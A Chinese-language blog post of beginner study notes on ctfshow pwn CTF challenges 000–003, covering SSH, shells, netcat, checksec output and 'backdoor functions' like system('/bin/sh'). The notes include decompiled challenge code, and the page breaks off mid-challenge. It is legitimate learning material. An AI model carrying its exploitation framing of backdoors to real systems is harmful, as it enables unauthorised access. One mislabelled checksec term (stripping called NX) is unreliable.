<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="Hexo Theme Redefine"><meta name="author" content="bcmp"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="canonical" href="https://brocademaple.github.io/2024/07/17/cs_notes/pwn/【pvvn】000-036知识点记录/"><meta name="robots" content="index,follow"><meta name="googlebot" content="index,follow"><meta name="revisit-after" content="1 days"><meta name="description" content="¶写在前面  刚做完一遍，跟着vvp。基本流程是知道个七七八八了，这回重新把每道题看过去，提取一下知识点。为苯白痴量身制作的vvp白痴解释版思密达QwQ顺便复习（预习C语言  vvp的链接：【Puun】uup留档 | BROCADEMAPLE ¶000 ssh连接的彩蛋题 ¶什么是ssh连接  SSH（Secure Shell）是一种加密的网络协议，用于安全地访问远程计算机。 它提供了一个安全的渠"><meta property="og:type" content="article"><meta property="og:title" content="【Pvvn】000-036知识点记录"><meta property="og:url" content="https://brocademaple.github.io/2024/07/17/CS_Notes/PWN/%E3%80%90Pvvn%E3%80%91000-036%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/index.html"><meta property="og:site_name" content="私の宝庫です"><meta property="og:description" content="¶写在前面  刚做完一遍，跟着vvp。基本流程是知道个七七八八了，这回重新把每道题看过去，提取一下知识点。为苯白痴量身制作的vvp白痴解释版思密达QwQ顺便复习（预习C语言  vvp的链接：【Puun】uup留档 | BROCADEMAPLE ¶000 ssh连接的彩蛋题 ¶什么是ssh连接  SSH（Secure Shell）是一种加密的网络协议，用于安全地访问远程计算机。 它提供了一个安全的渠"><meta property="og:locale" content="zh_CN"><meta property="article:published_time" content="2024-07-16T16:00:00.000Z"><meta property="article:modified_time" content="2024-07-22T09:07:29.590Z"><meta property="article:author" content="brocademaple"><meta property="article:tag" content="CS Notes"><meta property="article:tag" content="Pwn"><meta name="twitter:card" content="summary"><link rel="icon" type="image/png" href="/images/goose.png" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/goose.png"><meta name="theme-color" content="#A31F34"><link rel="shortcut icon" href="/images/goose.png"><title>【Pvvn】000-036知识点记录 - BROCADEMAPLE</title><link rel="stylesheet" href="/fonts/Chillax/chillax.css"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/assets/build/styles.css"><link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css"><link rel="stylesheet" href="/fonts/Geist/geist.css"><link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Farsan&display=swap" rel="stylesheet"><script src="/js/libs/anime.min.js"></script><script id="hexo-configurations">window.config={hostname:"brocademaple.github.io",root:"/",language:"zh-CN",path:"search.xml"},window.theme={articles:{style:{font_size:"20px",line_height:1.5,image_border_radius:"14px",image_alignment:"center",image_caption:!1,link_icon:!0,title_alignment:"left",headings_top_spacing:{h1:"3.2rem",h2:"2.4rem",h3:"1.9rem",h4:"1.6rem",h5:"1.4rem",h6:"1.3rem"}},word_count:{enable:!0,count:!0,min2read:!0},author_label:{enable:!0,auto:!1,list:[]},code_block:{copy:!0,style:"mac",highlight_theme:{light:"github",dark:"vs2015"},font:{enable:!1,family:null,url:null}},toc:{enable:!0,max_depth:6,number:!1,expand:!0,init_open:!0},copyright:{enable:!0,default:"cc_by_nc_sa"},lazyload:!0,recommendation:{enable:!1,title:"推荐阅读",limit:3,mobile_limit:2,placeholder:"/images/wallhaven-wqery6-light.webp",skip_dirs:[]}},colors:{primary:"#A31F34",secondary:null,default_mode:"light"},global:{fonts:{chinese:{enable:!0,family:"Noto  Sans SC",url:"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},english:{enable:!0,family:"Farsan",url:"https://fonts.googleapis.com/css2?family=Farsan&display=swap"},title:{enable:!1,family:null,url:null}},content_max_width:"1000px",sidebar_width:"210px",hover:{shadow:!0,scale:!0},scroll_progress:{bar:!0,percentage:!0},website_counter:{url:"https://cn.v ercount.one/js",enable:!0,site_pv:!0,site_uv:!0,post_pv:!0},single_page:!0,preloader:{enable:!0,custom_message:"live, love, life"},open_graph:!0,google_analytics:{enable:!1,id:null}},home_banner:{enable:!0,style:"fixed",image:{light:"/images/wallhaven-wqery6-light.webp",dark:"/images/wallhaven-wqery6-dark.webp"},title:"BROCADEMAPLE",subtitle:{text:["云淡风轻近午天，傍花随柳过前川","青山不墨千秋画，绿水无弦万古琴","同来不得同归去，故国逢春一寂寥"],hitokoto:{enable:!1,show_author:!1,api:"https://v1.hitokoto.cn"},typing_speed:100,backing_speed:80,starting_delay:500,backing_delay:1500,loop:!0,smart_backspace:!0},text_color:{light:"#fff",dark:"#d1d1b6"},text_style:{title_size:"2.8rem",subtitle_size:"1.5rem",line_height:1.2},custom_font:{enable:!1,family:null,url:null},social_links:{enable:!1,style:"default",links:{github:"https://github.com/brocademaple",instagram:null,zhihu:null,twitter:null,email:null},qrs:{weixin:null}}},plugins:{feed:{enable:!1},aplayer:{meting:!0,enable:!0,type:"fixed",audios:[{name:"Imagine",artist:"John Lennon",url:"https://evan.beee.top/music/Imagine%20-%20John%20Lennon.mp3",cover:"https://evan.beee.top/music/covers/Lennon_Imagine_Sleeve_1975.jpg"},{name:"Something Just Like This",artist:"Coldplay",url:"https://evan.beee.top/music/Something%20Just%20Like%20This%20-%20The%20Chainsmokers%E3%80%81Coldplay.mp3",cover:"https://evan.beee.top/music/covers/Something_Just_Like_This.png"}]},mermaid:{enable:!1,version:"9.3.0"}},version:"2.7.1",navbar:{auto_hide:!1,color:{left:"#f78736",right:"#367df7",transparency:35},width:{home:"1200px",pages:"1000px"},links:{Home:{path:"/",icon:"fa-solid fa-house"},Archives:{path:"/archives",icon:"fa-solid fa-archive"},Categories:{path:"/categories",icon:"fa-solid fa-list"},Tags:{path:"/tags/",icon:"fa-solid fa-tags"},Friends:{path:"/friends/",icon:"fa-solid fa-user-group"},About:{icon:"fa-regular fa-user",submenus:{Me:"/aboutMe",Github:"https://github.com/brocademaple"}},Links:{icon:"fa-solid fa-tags",submenus:{Friends:"/links",Link2:"/link2"}}},search:{enable:!0,preload:!0}},page_templates:{friends_column:3,tags_style:"cloud"},home:{sidebar:{enable:!0,position:"left",first_item:"menu",announcement:null,show_on_mobile:!0,links:{Home:{path:"/",icon:"fa-solid fa-house"},Archives:{path:"/archives",icon:"fa-solid fa-archive"},Categories:{path:"/categories",icon:"fa-solid fa-list"},Tags:{path:"/tags",icon:"fa-solid fa-tags"},Friends:{path:"/links",icon:"fa-solid fa-user-group"},About:{path:"/aboutMe",icon:"fa-regular fa-user"}}},article_date_format:"auto",excerpt_length:200,categories:{enable:!0,limit:3},tags:{enable:!0,limit:3}},footerStart:"2024/7/1 21:44:00"},window.lang_ago={second:"%s 秒前",minute:"%s 分钟前",hour:"%s 小时前",day:"%s 天前",week:"%s 周前",month:"%s 个月前",year:"%s 年前"},window.data={masonry:!1}</script><link rel="stylesheet" href="/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/fontawesome/brands.min.css"><link rel="stylesheet" href="/fontawesome/solid.min.css"><link rel="stylesheet" href="/fontawesome/regular.min.css"><meta name="generator" content="Hexo 7.2.0"></head><body><div class="progress-bar-container"><span class="scroll-progress-bar"></span> <span class="pjax-progress-bar"></span></div><style>:root{--preloader-background-color:#fff;--preloader-text-color:#000}@media (prefers-color-scheme:dark){:root{--preloader-background-color:#202124;--preloader-text-color:#fff}}@media (prefers-color-scheme:light){:root{--preloader-background-color:#fff;--preloader-text-color:#000}}@media (max-width:600px){.ml13{font-size:2.6rem!important}}.preloader{display:flex;flex-direction:column;gap:1rem;align-items:center;justify-content:center;position:fixed;padding:12px;top:0;right:0;bottom:0;left:0;width:100vw;height:100vh;background-color:var(--preloader-background-color);z-index:1100;transition:opacity .2s ease-in-out}.ml13{font-size:3.2rem;color:var(--preloader-text-color);letter-spacing:-1px;font-weight:500;font-family:Chillax-Variable,sans-serif;text-align:center}.ml13 .word{display:inline-flex;flex-wrap:wrap;white-space:nowrap}.ml13 .letter{display:inline-block;line-height:1em}</style><div class="preloader"><h2 class="ml13">live, love, life</h2><script>var textWrapper = document.querySelector('.ml13');
        // Split text into words
        var words = textWrapper.textContent.trim().split(' ');

        // Clear the existing content
        textWrapper.innerHTML = '';

        // Wrap each word and its letters in spans
        words.forEach(function(word) {
            var wordSpan = document.createElement('span');
            wordSpan.classList.add('word');
            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
            textWrapper.appendChild(wordSpan);
            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
        });

        var animation = anime.timeline({loop: true})
            .add({
                targets: '.ml13 .letter',
                translateY: [40,0],
                translateZ: 0,
                opacity: [0,1],
                filter: ['blur(5px)', 'blur(0px)'], // Starting from blurred to unblurred
                easing: "easeOutExpo",
                duration: 1400,
                delay: (el, i) => 300 + 30 * i,
            }).add({
                targets: '.ml13 .letter',
                translateY: [0,-40],
                opacity: [1,0],
                filter: ['blur(0px)', 'blur(5px)'], // Ending from unblurred to blurred
                easing: "easeInExpo",
                duration: 1200,
                delay: (el, i) => 100 + 30 * i,
                complete: function() {
                    hidePreloader(); // Call hidePreloader after the animation completes
                }
            });

        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;

        // If the theme status is not found in local storage, check the preferred color scheme
        if (themeStatus === undefined || themeStatus === null) {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                themeStatus = 'dark';
            } else {
                themeStatus = 'light';
            }
        }

        // Now you can use the themeStatus variable in your code
        if (themeStatus) {
            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
        } else {
            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
            document.documentElement.style.setProperty('--preloader-text-color', '#000');
        }

        window.addEventListener('load', function () {
            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
        });

        function hidePreloader() {
            var preloader = document.querySelector('.preloader');
            preloader.style.opacity = '0';
            setTimeout(function () {
                preloader.style.display = 'none';
            }, 200);
        }</script></div><main class="page-container" id="swup"><div class="main-content-container"><div class="main-content-header"><header class="navbar-container px-6 md:px-12"><div class="navbar-content"><div class="left"><a class="logo-title" href="/">BROCADEMAPLE</a></div><div class="right"><div class="desktop"><ul class="navbar-list"><li class="navbar-item"><a href="/"><i class="fa-solid fa-house fa-fw"></i> 首页</a></li><li class="navbar-item"><a href="/archives"><i class="fa-solid fa-archive fa-fw"></i> 归档</a></li><li class="navbar-item"><a href="/categories"><i class="fa-solid fa-list fa-fw"></i> 分类</a></li><li class="navbar-item"><a href="/tags/"><i class="fa-solid fa-tags fa-fw"></i> 标签</a></li><li class="navbar-item"><a href="/friends/"><i class="fa-solid fa-user-group fa-fw"></i> 友情链接</a></li><li class="navbar-item"><a class="has-dropdown" href="#" onclick="&#34;return" false;&#34;><i class="fa-regular fa-user fa-fw"></i> 关于 <i class="fa-solid fa-chevron-down fa-fw"></i></a><ul class="sub-menu"><li><a href="/aboutMe">ME</a></li><li><a target="_blank" rel="noopener" href="https://github.com/brocademaple">GITHUB</a></li></ul></li><li class="navbar-item"><a class="has-dropdown" href="#" onclick="&#34;return" false;&#34;><i class="fa-solid fa-tags fa-fw"></i> 链接 <i class="fa-solid fa-chevron-down fa-fw"></i></a><ul class="sub-menu"><li><a href="/links">友情链接</a></li><li><a href="/link2">LINK2</a></li></ul></li><li class="navbar-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div><div class="icon-item navbar-bar"><div class="navbar-bar-middle"></div></div></div></div></div><div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between"><ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start"><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/"><span>首页 </span><i class="fa-solid fa-house fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/archives"><span>归档 </span><i class="fa-solid fa-archive fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/categories"><span>分类 </span><i class="fa-solid fa-list fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/tags/"><span>标签 </span><i class="fa-solid fa-tags fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/friends/"><span>友情链接 </span><i class="fa-solid fa-user-group fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full"><div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" navbar-data-toggle="submenu-About"><span>关于 </span><i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i></div><div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About"><div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl"><a class="text-third-text-color text-xl" href="/aboutMe">ME</a></div><div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl"><a class="text-third-text-color text-xl" target="_blank" rel="noopener" href="https://github.com/brocademaple">GITHUB</a></div></div></li><li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full"><div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" navbar-data-toggle="submenu-Links"><span>链接 </span><i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i></div><div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-Links"><div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl"><a class="text-third-text-color text-xl" href="/links">友情链接</a></div><div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl"><a class="text-third-text-color text-xl" href="/link2">LINK2</a></div></div></li></ul><div class="statistics flex justify-around my-2.5"><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">42</div><div class="label text-third-text-color text-sm">标签</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">34</div><div class="label text-third-text-color text-sm">分类</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">105</div><div class="label text-third-text-color text-sm">文章</div></a></div></div><div class="window-mask"></div></header></div><div class="main-content-body"><div class="main-content"><div class="post-page-container flex relative justify-between box-border w-full h-full"><div class="article-content-container"><div class="article-title relative w-full"><div class="w-full flex items-center pt-6 justify-start"><h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">【Pvvn】000-036知识点记录</h1></div></div><div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8"><div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]"><img src="/images/goose_bg.png"></div><div class="info flex flex-col justify-between"><div class="author flex items-center"><span class="name text-default-text-color text-lg font-semibold">bcmp</span> <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-pen-fancy"></i>&nbsp; <span class="desktop">2024-07-17</span> <span class="mobile">2024-07-17</span> <span class="hover-info">创建</span> </span><span class="article-date article-meta-item"><i class="fa-regular fa-wrench"></i>&nbsp; <span class="desktop">2024-07-22 17:07:29</span> <span class="mobile">2024-07-22 17:07:29</span> <span class="hover-info">更新</span> </span><span class="article-categories article-meta-item"><i class="fa-regular fa-folders"></i>&nbsp;<ul><li><a href="/categories/notes/">notes</a>&nbsp;</li><li>></li><li><a href="/categories/notes/Pwn-notes/">Pwn notes</a>&nbsp;</li></ul></span><span class="article-tags article-meta-item"><i class="fa-regular fa-tags"></i>&nbsp;<ul><li><a href="/tags/CS-Notes/">CS Notes</a>&nbsp;</li><li>| <a href="/tags/Pwn/">Pwn</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fa-regular fa-typewriter"></i>&nbsp;<span>15.4k 字</span> </span><span class="article-min2read article-meta-item"><i class="fa-regular fa-clock"></i>&nbsp;<span>68 分钟</span> </span><span class="article-pv article-meta-item"><i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8"><h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3><ul><li>刚做完一遍，跟着vvp。基本流程是知道个七七八八了，这回重新把每道题看过去，提取一下知识点。为苯白痴量身制作的vvp白痴解释版思密达QwQ顺便复习（预习C语言</li></ul><p>vvp的链接：<a href="https://brocademaple.github.io/2024/07/16/CS_Notes/PWN/%5BPwn%5Dwp%E5%AD%98%E6%A1%A3/">【Puun】uup留档 | BROCADEMAPLE</a></p><h3 id="000-ssh连接的彩蛋题"><a class="header-anchor" href="#000-ssh连接的彩蛋题">¶</a>000 ssh连接的彩蛋题</h3><h4 id="什么是ssh连接"><a class="header-anchor" href="#什么是ssh连接">¶</a>什么是ssh连接</h4><ul><li>SSH（Secure Shell）是一种加密的网络协议，用于安全地访问远程计算机。</li><li>它提供了一个安全的渠道，允许用户在本地计算机上执行远程计算机上的命令，就像直接在远程计算机上操作一样。</li><li>SSH使用公钥加密技术来验证远程计算机和用户的身份，并为数据传输提供加密</li></ul><h4 id="什么是shell"><a class="header-anchor" href="#什么是shell">¶</a>什么是shell</h4><ol><li><strong>命令行界面</strong>：Shell是一个命令行界面（CLI），允许用户输入命令并接收输出结果。</li><li><strong>脚本执行</strong>：Shell可以执行脚本，这些脚本是一系列命令的集合，可以自动化任务。</li><li><strong>环境变量</strong>：Shell允许用户设置和使用环境变量，这些变量可以影响程序的行为。</li><li><strong>管道和重定向</strong>：Shell支持管道操作，可以将一个命令的输出作为另一个命令的输入。同时，Shell也支持输入输出的重定向。</li><li><strong>权限和安全</strong>：Shell执行的命令受到用户权限的限制。在安全方面，Shell需要正确配置以防止未授权访问。</li></ol><h4 id="在shell中输入id"><a class="header-anchor" href="#在shell中输入id">¶</a>在shell中输入id</h4><ul><li><code>id</code>命令用于显示当前用户的信息，包括用户ID（UID）、组ID（GID）以及其他所属的组。</li><li>在CTF赛题中，这可以帮助参赛者了解他们以哪个用户的身份登录，以及该用户具有哪些权限</li></ul><h4 id="ls-区别于ls的作用"><a class="header-anchor" href="#ls-区别于ls的作用">¶</a>ls /区别于ls的作用</h4><ul><li><code>ls</code>命令用于列出目录中的文件和子目录。不加任何参数时，默认列出当前目录的内容。</li><li><code>ls /</code>命令列出的是根目录（<code>/</code>）的内容。根目录是文件系统的最顶层目录，包含了所有其他目录和文件。这可以帮助参赛者了解服务器的文件系统结构。</li><li>通常，<code>ls</code>命令会列出<em><strong>当前工作目录</strong></em>的内容，而<code>ls /</code>则是列出<em><strong>根目录</strong></em>的内容，两者的区别在于它们指定的目录不同</li></ul><h3 id="001-nc连接-后门函数"><a class="header-anchor" href="#001-nc连接-后门函数">¶</a>001 nc连接+后门函数</h3><h4 id="什么是nc连接"><a class="header-anchor" href="#什么是nc连接">¶</a>什么是nc连接</h4><ul><li><code>nc</code>（Netcat）是一个用于网络工具，可以用于读写网络连接，使用TCP或UDP协议。它可以用来创建监听在特定端口的服务器，也可以用来发起连接到远程服务器的客户端。<code>nc</code>因其简单性和灵活性，在网络安全领域被广泛用于测试网络服务和进行端口扫描</li></ul><h4 id="nc连接和ssh连接的关联和区别"><a class="header-anchor" href="#nc连接和ssh连接的关联和区别">¶</a>nc连接和ssh连接的关联和区别</h4><ul><li><strong>关联</strong>：<code>nc</code>可以用来创建一个简单的SSH连接，例如，使用<code>nc</code>监听本地端口并转发到远程主机的SSH端口，实现端口转发。</li><li><strong>区别</strong>：<ul><li><strong>协议</strong>：SSH是一种加密的网络协议，专为安全访问远程计算机而设计；而<code>nc</code>是一个更为通用的网络工具，不提供加密功能。</li><li><strong>安全性</strong>：SSH提供了加密和身份验证机制，确保数据传输的安全性；<code>nc</code>则不加密数据，容易受到中间人攻击。</li><li><strong>用途</strong>：SSH主要用于远程登录和命令执行，而<code>nc</code>可以用于更广泛的网络通信任务，如端口扫描、数据传输等。</li></ul></li></ul><h4 id="checksec"><a class="header-anchor" href="#checksec">¶</a>checksec</h4><ul><li><code>checksec</code>是一个用于分析程序二进制文件的安全特性的工具，它可以帮助user了解程序的内存保护机制，例如栈保护（<strong>Stack Canaries</strong>）、地址空间布局随机化（<strong>ASLR</strong>）、非执行栈（<strong>NoExecStack</strong>）、符号表剥离（<strong>NX</strong>）等。</li><li>在CTF的Pwn（二进制漏洞利用）方向中，了解这些安全特性对于找到漏洞和制定利用策略至关重要</li></ul><h4 id="system-“cat-ctfshow-flag”-是后门函数的原因"><a class="header-anchor" href="#system-“cat-ctfshow-flag”-是后门函数的原因">¶</a>system(“cat /ctfshow_flag”)是后门函数的原因</h4><ul><li><code>system</code>函数是C语言标准库中的一个函数，它允许调用shell命令。</li><li>如果一个程序中存在<code>system(&quot;cat /ctfshow_flag&quot;)</code>这样的代码，它实际上是在调用系统shell来执行<code>cat /ctfshow_flag</code>命令，这通常不是一个正常的程序行为，而是故意留下的后门</li></ul><h4 id="后门函数"><a class="header-anchor" href="#后门函数">¶</a>后门函数</h4><ul><li><p>后门函数是指在软件中故意或无意留下的代码，允许未经授权的用户绕过正常的认证和授权机制，获得对系统的访问权限或执行特定的操作。后门可以是一段代码、一个配置设置，或者是一个隐藏的接口。在CTF比赛中，找到并利用后门是获取Flag的一种常见策略。</p></li><li><p>在比赛中，参赛者需要利用程序的漏洞来执行任意代码，而后门函数如<code>system</code>可以被用来执行特定的命令，如读取Flag文件。</p></li><li><p>然而，使用后门函数通常需要找到一种方法来绕过程序的正常逻辑，这可能涉及到溢出、格式化字符串攻击等技术</p></li></ul><h4 id="在本地写入一个flag文件作为测试"><a class="header-anchor" href="#在本地写入一个flag文件作为测试">¶</a>在本地写入一个flag文件作为测试</h4><p><code>echo &quot;flag&#123;just_test_my_process! &#125;&quot;&gt;/c|t|f|s|h|o|w_flag</code></p><p>然后运行pvvn程序，可以得到本地写入的flag值</p><p>后面的题中，在连接远程环境之前，可以先本地运行pvvn文件，测试能否得到这个flag值</p><h3 id="002-shell-分析c代码"><a class="header-anchor" href="#002-shell-分析c代码">¶</a>002 shell+分析c代码</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn002/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></div><p>64位程序，仅关闭canary</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span> &#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  logo();  <span class="comment">// 显示logo</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; Now, you can use &#x27;cat /ctfshow_flag&#x27; to get flag! &quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);  <span class="comment">// 后门函数，给了一个shell</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这段代码设计了一个程序，启动时会调整一些I/O缓冲设置，展示一个欢迎信息，并最终提供一个交互式shell，暗示用户可以通过特定命令获取某个“flag”</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /bin/sh</span><br><span class="line">... -&gt; dash  // </span><br></pre></td></tr></table></figure></div><h4 id="setvbuf调用"><a class="header-anchor" href="#setvbuf调用">¶</a>setvbuf调用</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setvbuf(_bss_start, 0LL, 2, 0LL);</span><br><span class="line">setvbuf(stdin, 0LL, 2, 0LL);</span><br></pre></td></tr></table></figure></div><ul><li><p><code>setvbuf</code>函数用于控制缓冲区行为。这里进行了两次调用，分别针对<code>_bss_start</code>和标准输入<code>stdin</code>。</p></li><li><p><code>_bss_start</code>通常指向未初始化数据段的开始，这里的调用可能意在对程序的BSS段（存放未初始化全局变量和静态变量的部分）进行缓冲区设置。但是，传入的参数（尤其是第二个参数为NULL和第三个参数为2）表明它试图禁用缓冲或使用无缓冲I/O。实际上，直接对_BSS_START进行这样的操作不太常见且可能不正确，因为_BSS_START不是一个标准的文件流。</p></li><li><p>对于<code>stdin</code>的<code>setvbuf</code>调用，它设置了标准输入流为无缓冲I/O（模式2），这意味着从标准输入读取数据时将直接进行，没有缓冲延迟，这对于交互式shell尤其重要。</p></li></ul><h4 id="system-“-bin-sh”-的工作原理"><a class="header-anchor" href="#system-“-bin-sh”-的工作原理">¶</a>system(“/bin/sh”)的工作原理</h4><ul><li>system()函数先fork一个子进程，在这个子进程中调用/bin/sh -c来执行command指定的命令。</li><li>/bin/sh在系统中一般是个软链接，指向dash或者bash等常用的shell，-c选项是告诉shell从字符串</li><li>command中读取要执行的命令（shell将扩展command中的任何特殊字符）。父进程则调用waitpid()函数来为变成僵尸的子进程收尸，获得其结束状态，然后将这个结束状态返回给system()函数的调用者</li><li>执行完这个后它就会返回一个shell给函数的调用者</li><li>system(“cat /ctfshow_flag”); system(“/bin/sh”);这一类的我们称之为后门函数，再后续利用过程中我们要尽可能找到或者构造出来</li></ul><h3 id="003-真假命令（一）"><a class="header-anchor" href="#003-真假命令（一）">¶</a>003 真假命令（一）</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[*] level up ! Let&#x27;s go ! </span><br><span class="line">You can call the following function:</span><br><span class="line">1._start</span><br><span class="line">2.main</span><br><span class="line">3.hello_ctfshow</span><br><span class="line">4.ctfshow(&#x27;echo /ctfshow_flag&#x27;)</span><br><span class="line">5.print(&#x27;/ctfshow_flag&#x27;)</span><br><span class="line">6.system(&#x27;cat /ctfshow_flag&#x27;)</span><br><span class="line">7.puts(&#x27;/ctfshow_flag&#x27;)</span><br><span class="line">8.exit</span><br><span class="line">Your choice is :</span><br></pre></td></tr></table></figure></div><p>看起来是这样的，看起来选6，但是真的假的还是得看源代码</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn003/pwn&#x27;</span><br><span class="line">    Arch:     